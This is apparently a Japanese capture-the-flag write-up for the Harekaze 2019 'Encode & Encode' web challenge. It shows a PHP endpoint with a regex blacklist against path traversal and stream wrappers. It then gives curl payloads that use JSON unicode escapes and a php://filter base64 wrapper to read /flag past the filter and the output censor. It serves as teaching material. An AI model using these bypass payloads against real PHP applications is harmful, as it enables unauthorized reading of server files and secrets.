# Harekaze 2019 "Encode & Encode" writeup

## problem

```
I made a strong WAF, so you definitely can’t read the flag!
```

<http://problem.harekaze.com:10001/>

<http://153.127.202.154:1001/>

Docker で問題サーバーを立てることができます

```
$ cd src/
$ docker build ./ -t harekaze_encode_image
$ docker run --name harekaze_encode_container -d -p 80:80 harekaze_encode_image
```

## solution

```html
<script>
window.addEventListener('DOMContentLoaded', () => {
  let content = document.getElementById('content');
  for (let link of document.getElementsByClassName('link')) {
    link.addEventListener('click', () => {
      fetch('query.php', {
        'method': 'POST',
        'headers': {
          'Content-Type': 'application/json'
        },
        'body': JSON.stringify({
          'page': link.href.split('#')[1]
        })
      }).then(resp => resp.json()).then(resp => {
        content.innerHTML = resp.content;
      })
      return false;
    }, false);
  }
}, false);
</script>
```

```php
<?php
error_reporting(0);

if (isset($_GET['source'])) {
  show_source(__FILE__);
  exit();
}

function is_valid($str) {
  $banword = [
    // no path traversal
    '\.\.',
    // no stream wrapper
    '(php|file|glob|data|tp|zip|zlib|phar):',
    // no data exfiltration
    'flag'
  ];
  $regexp = '/' . implode('|', $banword) . '/i';
  if (preg_match($regexp, $str)) {
    return false;
  }
  return true;
}

$body = file_get_contents('php://input');
$json = json_decode($body, true);

if (is_valid($body) && isset($json) && isset($json['page'])) {
  $page = $json['page'];
  $content = file_get_contents($page);
  if (!$content || !is_valid($content)) {
    $content = "<p>not found</p>\n";
  }
} else {
  $content = '<p>invalid request</p>';
}

// no data exfiltration!!!
$content = preg_replace('/HarekazeCTF\{.+\}/i', 'HarekazeCTF{&lt;censored&gt;}', $content);
echo json_encode(['content' => $content]);
```

まずフロント側では query.php に対し application/json 形式で page を POST している

```
$ curl -X POST -H "Content-Type: application/json" -d '{"page":"pages/about.html"}' http://localhost/query.php
```

そしてバックエンドでは受け取った json を読み込み、is_valid でチェックをし、file_get_contents でローカルファイルを読み込み、preg_replace を使いファイル内容を置き換えた後出力している。

また、Dockerfile で

```
RUN echo "HarekazeCTF{local_test}" > /flag
```

ルートディレクトリに flag ファイルがあることが分かる

よって方向性としては、

- is_valid に検知されないように {"page":"/flag"} を POST し、flag ファイルを読み込ませる

- flag ファイルの内容が preg_replace で置き換えられないようにエンコードして出力させる

となる

### is_valid のバイパス

JSON では \u と Unicode のコードポイント 16 進数 4 桁でユニコード文字を表現することが可能。

よって

[CyberChef](<https://gchq.github.io/CyberChef/#recipe=Escape_Unicode_Characters('%5C%5Cu',true,4,true)&input=L2ZsYWc>)

```
/flag
\u002F\u0066\u006C\u0061\u0067
```

と変換し、is_valid をバイパスすることができる

### preg_replace のバイパス

Unicode encoding で is_valid をバイパスすると

```
$ curl http://localhost/query.php -d '{"page":"\u002F\u0066\u006C\u0061\u0067"}'
{"content":"HarekazeCTF{&lt;censored&gt;}\n"}
```

flag が読み込まれるが preg_replace によって置き換えられてしまうので

[PHP 変換フィルタ](https://www.php.net/manual/ja/filters.convert.php)

を用いて falg を encode する

[CyberChef](<https://gchq.github.io/CyberChef/#recipe=Escape_Unicode_Characters('%5C%5Cu',true,4,true)&input=cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT0vZmxhZw>)

```
php://filter/convert.base64-encode/resource=/flag
\u0070\u0068\u0070\u003A\u002F\u002F\u0066\u0069\u006C\u0074\u0065\u0072\u002F\u0063\u006F\u006E\u0076\u0065\u0072\u0074\u002E\u0062\u0061\u0073\u0065\u0036\u0034\u002D\u0065\u006E\u0063\u006F\u0064\u0065\u002F\u0072\u0065\u0073\u006F\u0075\u0072\u0063\u0065\u003D\u002F\u0066\u006C\u0061\u0067
```

```
$ curl "http://localhost/query.php" -d '{"page":"\u0070\u0068\u0070\u003A\u002F\u002F\u0066\u0069\u006C\u0074\u0065\u0072\u002F\u0063\u006F\u006E\u0076\u0065\u0072\u0074\u002E\u0062\u0061\u0073\u0065\u0036\u0034\u002D\u0065\u006E\u0063\u006F\u0064\u0065\u002F\u0072\u0065\u0073\u006F\u0075\u0072\u0063\u0065\u003D\u002F\u0066\u006C\u0061\u0067"}'
{"content":"SGFyZWthemVDVEZ7bG9jYWxfdGVzdH0K"}
```

base64 でデコードし flag get
